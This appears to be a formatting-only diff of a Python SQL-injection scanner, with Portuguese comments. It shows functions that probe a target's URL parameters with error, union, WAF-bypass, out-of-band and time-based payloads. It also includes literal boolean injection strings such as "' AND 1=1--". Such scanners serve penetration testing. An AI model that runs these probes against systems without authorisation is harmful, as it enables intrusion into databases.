@@ -232,9 +232,7 @@ def _check_boolean_diff(r_true_len, r_false_len, r_baseline_len, param):
 
     # Condição: True é muito parecido com Baseline, e False é muito diferente
     # ou vice-versa, e a diferença entre eles é maior que a tolerância natural
-    if diff_true_false > tolerance and (
-        diff_true_base <= tolerance or diff_false_base <= tolerance
-    ):
+    if diff_true_false > tolerance and (diff_true_base <= tolerance or diff_false_base <= tolerance):
         return {
             "tipo": "SQLI_BLIND_BOOLEAN",
             "parametro": param,
@@ -248,13 +246,7 @@ def _check_boolean_diff(r_true_len, r_false_len, r_baseline_len, param):
 def _test_error_and_union(target, param, baseline_len):
     """Testa error-based e union-based em um parâmetro."""
     findings = []
-    all_payloads = (
-        ERROR_PAYLOADS
-        + UNION_PAYLOADS
-        + WAF_BYPASS_PAYLOADS
-        + OOB_PAYLOADS
-        + STACKED_PAYLOADS
-    )
+    all_payloads = ERROR_PAYLOADS + UNION_PAYLOADS + WAF_BYPASS_PAYLOADS + OOB_PAYLOADS + STACKED_PAYLOADS
     for payload, method in all_payloads:
         url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
         try:
@@ -281,9 +273,7 @@ def _test_time_based(target, param, baseline_latency):
             start = time.time()
             requests.get(url, timeout=12)
             elapsed = time.time() - start
-            vuln = _check_time_based(
-                method, elapsed, threshold, param, baseline_latency
-            )
+            vuln = _check_time_based(method, elapsed, threshold, param, baseline_latency)
             if vuln:
                 return vuln
         except requests.Timeout:
@@ -308,9 +298,7 @@ def _test_boolean_based(target, param):
         r_base = requests.get(f"http://{target}/?{param}=1", timeout=6)
         r_true = requests.get(f"http://{target}/?{param}=' AND 1=1--", timeout=6)
         r_false = requests.get(f"http://{target}/?{param}=' AND 1=2--", timeout=6)
-        return _check_boolean_diff(
-            len(r_true.text), len(r_false.text), len(r_base.text), param
-        )
+        return _check_boolean_diff(len(r_true.text), len(r_false.text), len(r_base.text), param)
     except Exception:
         return None
 
